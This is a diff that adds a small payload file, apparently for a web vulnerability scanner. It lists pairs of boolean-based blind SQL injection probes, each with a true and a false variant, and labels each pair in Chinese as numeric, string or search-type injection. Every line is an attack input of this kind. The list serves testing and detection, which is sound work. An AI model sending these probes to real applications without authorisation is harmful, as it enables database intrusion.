@@ -1,0 +1,17 @@
+﻿ and 1=1： and 1=2：Bool AND数字型SQL注入：1=1
+' or (1=1) and 'a'='a：' or (1=2) and 'a'='a：Bool OR字符型SQL注入：1=1
+ and 1=1#： and 1=2#：Bool AND数字型SQL注入：1=1
+' and 1=1#：' and 1=2#：Bool AND数字型SQL注入：1=1
+ and 1=1-- -： and 1=2-- -：Bool AND数字型SQL注入：1=1
+' and 1=1-- -：' and 1=2-- -：Bool AND数字型SQL注入：1=1
+ or(1=1)-- -： or(1=2)-- -：Bool AND数字型SQL注入：1=1
+' or(1=1)#：' or(1=2)#：Bool AND数字型SQL注入：1=1
+' and 1=1 and 'a'='a：' and 1=2 and 'a'='a：Bool AND字符型SQL注入：1=1
+%' and 1=1 and '%'='：%' and 1=2 and '%'='：Bool AND搜索型SQL注入('%xx%')：1=1
+') and 1=1 and ('1'='1：') and 1=2 and ('1'='1：Bool AND数字型SQL注入：1=1
+) or(1=1)-- -：) or(1=2)-- -：Bool AND数字型SQL注入：1=1
+') or(1=1)#：') or(1=2)#：Bool AND数字型SQL注入：1=1
+) and 1=1-- -：) and 1=2-- -：Bool AND数字型SQL注入：1=1
+') and 1=1#：') and 1=2#：Bool AND数字型SQL注入：1=1
+) and 1=1 and (2=2：) and 1=2 and (2=2：Bool AND数字型SQL注入：1=1
+') as tempxtestxtable where 1=1-- -：') as tempxtestxtable where 1=2-- -：Bool AND数字型SQL注入：1=1
